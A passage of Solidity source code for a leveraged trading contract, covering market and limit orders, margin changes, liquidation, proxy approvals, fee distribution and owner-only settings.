PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external returns(uint _limitPrice, address _tigAsset);\n    function _checkGas() external view;\n    function _closePosition(\n        uint _id,\n        uint _price,\n        uint _percent\n    ) external returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout);\n}\n\ninterface IStable is IERC20 {\n    function burnFrom(address account, uint amount) external;\n    function mintFor(address account, uint amount) external;\n}\n\ninterface ExtendedIERC20 is IERC20 {\n    function decimals() external view returns (uint);\n}\n\ninterface ERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract Trading is MetaContext, ITrading {\n\n    error LimitNotSet(); //7\n    error NotLiquidatable();\n    error TradingPaused();\n    error BadDeposit();\n    error BadWithdraw();\n    error ValueNotEqualToMargin();\n    error BadLeverage();\n    error NotMargin();\n    error NotAllowedPair();\n    error BelowMinPositionSize();\n    error BadClosePercent();\n    error NoPrice();\n    error LiqThreshold();\n\n    uint constant private DIVISION_CONSTANT = 1e10; // 100%\n    uint private constant liqPercent = 9e9; // 90%\n\n    struct Fees {\n        uint daoFees;\n        uint burnFees;\n        uint referralFees;\n        uint botFees;\n    }\n    Fees public openFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    Fees public closeFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    uint public limitOrderPriceRange = 1e8; // 1%\n\n    uint public maxWinPercent;\n    uint public vaultFundingPercent;\n\n    IPairsContract private pairsContract;\n    IPosition private position;\n    IGovNFT private gov;\n    ITradingExtension private tradingExtension;\n\n    struct Delay {\n        uint delay; // Block number where delay ends\n        bool actionType; // True for open, False for close\n    }\n    mapping(uint => Delay) public blockDelayPassed; // id => Delay\n    uint public blockDelay;\n    mapping(uint => uint) public limitDelay; // id => block.timestamp\n\n    mapping(address => bool) public allowedVault;\n\n    struct Proxy {\n        address proxy;\n        uint256 time;\n    }\n\n    mapping(address => Proxy) public proxyApprovals;\n\n    constructor(\n        address _position,\n        address _gov,\n        address _pairsContract\n    )\n    {\n        position = IPosition(_position);\n        gov = IGovNFT(_gov);\n        pairsContract = IPairsContract(_pairsContract);\n    }\n\n    // ===== END-USER FUNCTIONS =====\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateMarketOrder(\n        TradeInfo calldata _tradeInfo,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(position.getCount(), true);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\n        uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        uint256 _isLong = _tradeInfo.direction ? 1 : 2;\n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_tradeInfo.asset, _priceData, _signature, _isLong);\n        IPosition.MintTrade memory _mintTrade = IPosition.MintTrade(\n            _trader,\n            _marginAfterFees,\n            _tradeInfo.leverage,\n            _tradeInfo.asset,\n            _tradeInfo.direction,\n            _price,\n            _tradeInfo.tpPrice,\n            _tradeInfo.slPrice,\n            0,\n            _tigAsset\n        );\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        unchecked {\n            if (_tradeInfo.direction) {\n                tradingExtension.modifyLongOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            }\n        }\n        _updateFunding(_tradeInfo.asset, _tigAsset);\n        position.mint(\n            _mintTrade\n        );\n        unchecked {\n            emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n        }   \n    }\n\n    /**\n     * @dev initiate closing position\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed in BP\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _outputToken Token received upon closing trade\n     * @param _trader address the trade is initiated for\n     */\n    function initiateCloseOrder(\n        uint _id,\n        uint _percent,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _outputToken,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(_id, false);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit        \n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n\n        if (_percent > DIVISION_CONSTANT || _percent == 0) revert BadClosePercent();\n        _closePosition(_id, _percent, _price, _stableVault, _outputToken, false); \n    }\n\n    /**\n     * @param _id position id\n     * @param _addMargin margin amount used to add to the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _marginAsset Token being used to add to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addToPosition(\n        uint _id,\n        uint _addMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _marginAsset,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkDelay(_id, true);\n        IPosition.Trade memory _trade = position.trades(_id);\n        tradingExtension.validateTrade(_trade.asset, _trade.tigAsset, _trade.margin + _addMargin, _trade.leverage);\n        _checkVault(_stableVault, _marginAsset);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n        _handleDeposit(\n            _trade.tigAsset,\n            _marginAsset,\n            _addMargin - _fee,\n            _stableVault,\n            _permitData,\n            _trader\n        );\n        position.setAccInterest(_id);\n        unchecked {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, _trade.direction ? 1 : 2);\n            uint _positionSize = (_addMargin - _fee) * _trade.leverage / 1e18;\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, true, _positionSize);     \n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _addMargin -= _fee;\n            uint _newMargin = _trade.margin + _addMargin;\n            uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\n            position.addToPosition(\n                _trade.id,\n                _newMargin,\n                _newPrice\n            );\n            \n            emit AddToPosition(_trade.id, _newMargin, _newPrice, _trade.trader);\n        }\n    }\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _orderType type of limit order used to open the position\n     * @param _price limit price\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateLimitOrder(\n        TradeInfo calldata _tradeInfo,\n        uint256 _orderType, // 1 limit, 2 stop\n        uint256 _price,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        if (_orderType == 0) revert(\"5\");\n        if (_price == 0) revert NoPrice();\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        uint256 _id = position.getCount();\n        position.mint(\n            IPosition.MintTrade(\n                _trader,\n                _tradeInfo.margin,\n                _tradeInfo.leverage,\n                _tradeInfo.asset,\n                _tradeInfo.direction,\n                _price,\n                _tradeInfo.tpPrice,\n                _tradeInfo.slPrice,\n                _orderType,\n                _tigAsset\n            )\n        );\n        limitDelay[_id] = block.timestamp + 4;\n        emit PositionOpened(_tradeInfo, _orderType, _price, _id, _trader, _tradeInfo.margin);\n    }\n\n    /**\n     * @param _id position ID\n     * @param _trader address the trade is initiated for\n     */\n    function cancelLimitOrder(\n        uint256 _id,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType == 0) revert();\n        IStable(_trade.tigAsset).mintFor(_trader, _trade.margin);\n        position.burn(_id);\n        emit LimitCancelled(_id, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _marginAsset Token being used to add to the position\n     * @param _stableVault StableVault address\n     * @param _addMargin margin amount being added to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addMargin(\n        uint256 _id,\n        address _marginAsset,\n        address _stableVault,\n        uint256 _addMargin,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _marginAsset);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        _handleDeposit(_trade.tigAsset, _marginAsset, _addMargin, _stableVault, _permitData, _trader);\n        unchecked {\n            uint256 _newMargin = _trade.margin + _addMargin;\n            uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n            if (_newLeverage < asset.minLeverage) revert(\"!lev\");\n            position.modifyMargin(_id, _newMargin, _newLeverage);\n            emit MarginModified(_id, _newMargin, _newLeverage, true, _trader);\n        }\n    }\n\n    /**\n     * @param _id position id\n     * @param _stableVault StableVault address\n     * @param _outputToken token the trader will receive\n     * @param _removeMargin margin amount being removed from the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function removeMargin(\n        uint256 _id,\n        address _stableVault,\n        address _outputToken,\n        uint256 _removeMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        uint256 _newMargin = _trade.margin - _removeMargin;\n        uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n        if (_newLeverage > asset.maxLeverage) revert(\"!lev\");\n        (uint _assetPrice,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        (,int256 _payout) = TradingLibrary.pnl(_trade.direction, _assetPrice, _trade.price, _newMargin, _newLeverage, _trade.accInterest);\n        unchecked {\n            if (_payout <= int256(_newMargin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert LiqThreshold();\n        }\n        position.modifyMargin(_trade.id, _newMargin, _newLeverage);\n        _handleWithdraw(_trade, _stableVault, _outputToken, _removeMargin);\n        emit MarginModified(_trade.id, _newMargin, _newLeverage, false, _trader);\n    }\n\n    /**\n     * @param _type true for TP, false for SL\n     * @param _id position id\n     * @param _limitPrice TP/SL trigger price\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function updateTpSl(\n        bool _type,\n        uint _id,\n        uint _limitPrice,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_type) {\n            position.modifyTp(_id, _limitPrice);\n        } else {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            _checkSl(_limitPrice, _trade.direction, _price);\n            position.modifySl(_id, _limitPrice);\n        }\n        emit UpdateTPSL(_id, _type, _limitPrice, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function executeLimitOrder(\n        uint _id, \n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) \n        external\n    {\n        unchecked {\n            _checkDelay(_id, true);\n            tradingExtension._checkGas();\n            if (tradingExtension.paused()) revert TradingPaused();\n            require(block.timestamp >= limitDelay[_id]);\n            IPosition.Trade memory trade = position.trades(_id);\n            uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n            (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n            if (trade.orderType == 0) revert(\"5\");\n            if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n            if (trade.direction && trade.orderType == 1) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 1) {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 2) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } else {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } \n            if(trade.direction) {\n                trade.price += trade.price * _spread / DIVISION_CONSTANT;\n            } else {\n                trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n            }\n            if (trade.direction) {\n                tradingExtension.modifyLongOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            } else {\n                tradingExtension.modifyShortOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            }\n            _updateFunding(trade.asset, trade.tigAsset);\n            position.executeLimitOrder(_id, trade.price, trade.margin - _fee);\n            emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @notice liquidate position\n     * @param _id id of the position NFT\n     * @param _priceData verifiable off-chain data\n     * @param _signature node signature\n     */\n    function liquidatePosition(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        unchecked {\n            tradingExtension._checkGas();\n            IPosition.Trade memory _trade = position.trades(_id);\n            if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            (uint256 _positionSizeAfterPrice, int256 _payout) = TradingLibrary.pnl(_trade.direction, _price, _trade.price, _trade.margin, _trade.leverage, _trade.accInterest);\n            uint256 _positionSize = _trade.margin*_trade.leverage/1e18;\n            if (_payout > int256(_trade.margin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert NotLiquidatable();\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _handleCloseFees(_trade.asset, type(uint).max, _trade.tigAsset, _positionSizeAfterPrice, _trade.trader, true);\n            position.burn(_id);\n            emit PositionLiquidated(_id, _trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @dev close position at a pre-set price\n     * @param _id id of the position NFT\n     * @param _tp true if take profit\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    /**\n     * @notice Trader can approve a proxy wallet address for it to trade on its behalf. Can also provide proxy wallet with gas.\n     * @param _proxy proxy wallet address\n     * @param _timestamp end timestamp of approval period\n     */\n    function approveProxy(address _proxy, uint256 _timestamp) external payable {\n        proxyApprovals[_msgSender()] = Proxy(\n            _proxy,\n            _timestamp\n        );\n        payable(_proxy).transfer(msg.value);\n    }\n\n    // ===== INTERNAL FUNCTIONS =====\n\n    /**\n     * @dev close the initiated position.\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed\n     * @param _price pair price\n     * @param _stableVault StableVault address\n     * @param _outputToken Token that trader will receive\n     * @param _isBot false if closed via market order\n     */\n    function _closePosition(\n        uint _id,\n        uint _percent,\n        uint _price,\n        address _stableVault,\n        address _outputToken,\n        bool _isBot\n    )\n        internal\n    {\n        (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) = tradingExtension._closePosition(_id, _price, _percent);\n        position.setAccInterest(_id);\n        _updateFunding(_trade.asset, _trade.tigAsset);\n        if (_percent < DIVISION_CONSTANT) {\n            if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n            position.reducePosition(_id, _percent);\n        } else {\n            position.burn(_id);\n        }\n        uint256 _toMint;\n        if (_payout > 0) {\n            unchecked {\n                _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n                if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n                    _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n                }\n            }\n            _handleWithdraw(_trade, _stableVault, _outputToken, _toMint);\n        }\n        emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n    }\n\n    /**\n     * @dev handle stablevault deposits for different trading functions\n     * @param _tigAsset tigAsset token address\n     * @param _marginAsset token being deposited into stablevault\n     * @param _margin amount being deposited\n     * @param _stableVault StableVault address\n     * @param _permitData Data for approval via permit\n     * @param _trader Trader address to take tokens from\n     */\n    function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault, ERC20PermitData calldata _permitData, address _trader) internal {\n        IStable tigAsset = IStable(_tigAsset);\n        if (_tigAsset != _marginAsset) {\n            if (_permitData.usePermit) {\n                ERC20Permit(_marginAsset).permit(_trader, address(this), _permitData.amount, _permitData.deadline, _permitData.v, _permitData.r, _permitData.s);\n            }\n            uint256 _balBefore = tigAsset.balanceOf(address(this));\n            uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n            IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n            IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n            IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n            if (tigAsset.balanceOf(address(this)) != _balBefore + _margin) revert BadDeposit();\n            tigAsset.burnFrom(address(this), tigAsset.balanceOf(address(this)));\n        } else {\n            tigAsset.burnFrom(_trader, _margin);\n        }        \n    }\n\n    /**\n     * @dev handle stablevault withdrawals for different trading functions\n     * @param _trade Position info\n     * @param _stableVault StableVault address\n     * @param _outputToken Output token address\n     * @param _toMint Amount of tigAsset minted to be used for withdrawal\n     */\n    function _handleWithdraw(IPosition.Trade memory _trade, address _stableVault, address _outputToken, uint _toMint) internal {\n        IStable(_trade.tigAsset).mintFor(address(this), _toMint);\n        if (_outputToken == _trade.tigAsset) {\n            IERC20(_outputToken).transfer(_trade.trader, _toMint);\n        } else {\n            uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n            IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n            if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n            IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n        }        \n    }\n\n    /**\n     * @dev handle fees distribution for opening\n     * @param _asset asset id\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _tigAsset tigAsset address\n     * @param _isBot false if opened via market order\n     * @return _feePaid total fees paid during opening\n     */\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = openFees;\n        unchecked {\n            _fees.daoFees = _fees.daoFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.burnFees = _fees.burnFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.referralFees = _fees.referralFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.botFees = _fees.botFees * asset.feeMultiplier / DIVISION_CONSTANT;\n        }\n        address _referrer = tradingExtension.getRef(_trader); //referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _referrer,\n                    _positionSize\n                    * _fees.referralFees // get referral fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.referralFees*2;\n        }\n        if (_isBot) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _positionSize\n                    * _fees.botFees // get bot fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.botFees;\n        } else {\n            _fees.botFees = 0;\n        }\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees) // get total fee%\n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n            emit FeesDistributed(\n                _tigAsset,\n                _daoFeesPaid,\n                _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n                _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n                _positionSize * _fees.botFees / DIVISION_CONSTANT,\n                _referrer\n            );\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n\n    /**\n     * @dev handle fees distribution for closing\n     * @param _asset asset id\n     * @param _payout payout to trader before fees\n     * @param _tigAsset margin asset\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _isBot false if closed via market order\n     * @return payout_ payout to trader after fees\n     */\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = closeFees;\n        uint _daoFeesPaid;\n        uint _burnFeesPaid;\n        uint _referralFeesPaid;\n        unchecked {\n            _daoFeesPaid = (_positionSize*_fees.daoFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            _burnFeesPaid = (_positionSize*_fees.burnFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n        }\n        uint _botFeesPaid;\n        address _referrer = tradingExtension.getRef(_trader);//referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                _referralFeesPaid = (_positionSize*_fees.referralFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            }\n            IStable(_tigAsset).mintFor(\n                _referrer,\n                _referralFeesPaid\n            );\n             _daoFeesPaid = _daoFeesPaid-_referralFeesPaid*2;\n        }\n        if (_isBot) {\n            unchecked {\n                _botFeesPaid = (_positionSize*_fees.botFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _botFeesPaid\n                );\n            }\n            _daoFeesPaid = _daoFeesPaid - _botFeesPaid;\n        }\n        emit FeesDistributed(_tigAsset, _daoFeesPaid, _burnFeesPaid, _referralFeesPaid, _botFeesPaid, _referrer);\n        payout_ = _payout - _daoFeesPaid - _burnFeesPaid - _botFeesPaid;\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n\n    /**\n     * @dev update funding rates after open interest changes\n     * @param _asset asset id\n     * @param _tigAsset tigAsset used for OI\n     */\n    function _updateFunding(uint256 _asset, address _tigAsset) internal {\n        position.updateFunding(\n            _asset,\n            _tigAsset,\n            pairsContract.idToOi(_asset, _tigAsset).longOi,\n            pairsContract.idToOi(_asset, _tigAsset).shortOi,\n            pairsContract.idToAsset(_asset).baseFundingRate,\n            vaultFundingPercent\n        );\n    }\n\n    /**\n     * @dev check that SL price is valid compared to market price\n     * @param _sl SL price\n     * @param _direction long/short\n     * @param _price market price\n     */\n    function _checkSl(uint _sl, bool _direction, uint _price) internal pure {\n        if (_direction) {\n            if (_sl > _price) revert(\"3\"); //BadStopLoss\n        } else {\n            if (_sl < _price && _sl != 0) revert(\"3\"); //BadStopLoss\n        }\n    }\n\n    /**\n     * @dev check that trader address owns the position\n     * @param _id position id\n     * @param _trader trader address\n     */\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n\n    /**\n     * @notice Check that sufficient time has passed between opening and closing\n     * @dev This is to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\".\n     * @param _id position id\n     * @param _type true for opening, false for closing\n     */\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n    /**\n     * @dev Check that the stablevault input is whitelisted and the margin asset is whitelisted in the vault\n     * @param _stableVault StableVault address\n     * @param _token Margin asset token address\n     */\n    function _checkVault(address _stableVault, address _token) internal view {\n        require(allowedVault[_stableVault], \"Unapproved stablevault\");\n        require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n    }\n\n    /**\n     * @dev Check that the trader has approved the proxy address to trade for it\n     * @param _trader Trader address\n     */\n    function _validateProxy(address _trader) internal view {\n        if (_trader != _msgSender()) {\n            Proxy memory _proxy = proxyApprovals[_trader];\n            require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n        }\n    }\n\n    // ===== GOVERNANCE-ONLY =====\n\n    /**\n     * @dev Sets block delay between opening and closing\n     * @notice In blocks not seconds\n     * @param _blockDelay delay amount\n     */\n    function setBlockDelay(\n        uint _blockDelay\n    )\n        external\n        onlyOwner\n    {\n        blockDelay = _blockDelay;\n    }\n\n    /**\n     * @dev Whitelists a stablevault contract address\n     * @param _stableVault StableVault address\n     * @param _bool true if allowed\n     */\n    function setAllowedVault(\n        address _stableVault,\n        bool _bool\n    )\n        external\n        onlyOwner\n    {\n        allowedVault[_stableVault] = _bool;\n    }\n\n    /**\n     * @dev Sets max payout % compared to margin\n     * @param _maxWinPercent payout %\n     */\n    function setMaxWinPercent(\n        uint _maxWinPercent\n    )\n        external\n        onlyOwner\n    {\n        maxWinPercent = _maxWinPercent;\n    }\n\n    /**\n     * @dev Sets executable price range for limit orders\n     * @param _range price range in %\n     */\n    function setLimitOrderPriceRange(uint _range) external onlyOwner {\n        limitOrderPriceRange = _range;\n    }\n\n    /**\n     * @dev Sets the fees for the trading protocol\n     * @param _open True if open fees are being set\n     * @param _daoFees Fees distributed to the DAO\n     * @param _burnFees Fees which get burned\n     * @param _referralFees Fees given to referrers\n     * @param _botFees Fees given to bots that execute limit orders\n     * @param _percent Percent of earned funding fees going to StableVault\n     */\n    function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n        unchecked {\n            require(_daoFees >= _botFees+_referralFees*2);\n            if (_open) {\n                openFees.daoFees = _daoFees;\n                openFees.burnFees = _burnFees;\n                openFees.referralFees = _referralFees;\n                openFees.botFees = _botFees;\n            } else {\n                closeFees.daoFees = _daoFees;\n                closeFees.burnFees = _burnFees;\n                closeFees.referralFees = _referralFees;\n                closeFees.botFees = _botFees;                \n            }\n            require(_percent <= DIVISION_CONSTANT);\n            vaultFundingPercent = _percent;\n        }\n    }\n\n    /**\n     * @dev Sets the extension contract address for trading\n     * @param _ext extension contract address\n  